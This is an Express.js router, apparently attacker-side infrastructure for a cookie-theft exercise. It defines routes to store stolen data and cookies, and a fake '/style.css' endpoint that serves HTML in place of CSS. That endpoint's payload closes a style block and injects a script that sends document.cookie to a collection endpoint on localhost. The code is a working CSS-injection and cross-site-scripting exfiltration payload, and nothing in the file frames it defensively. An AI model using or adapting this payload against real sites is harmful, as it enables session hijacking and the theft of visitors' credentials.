const express = require('express');
const router = express.Router();
const cookieController = require('../controllers/cookieController')

router.post('/error', cookieController.storeError);
router.post('/data', cookieController.storeData);
router.get('/proxy', cookieController.proxy);
router.get('/cookie', cookieController.cookie);

router.get('/style.css', (req, res) => {
    // Force le navigateur à traiter ce fichier comme du HTML
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    res.setHeader('ETag', '');
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(`
      }/*
      </style>
      <script>
        fetch('http://localhost:8080/api/cookie?c=' + document.cookie);
        console.log(11111111111111)
      </script>
      <style>/*
    `);
});


module.exports = router;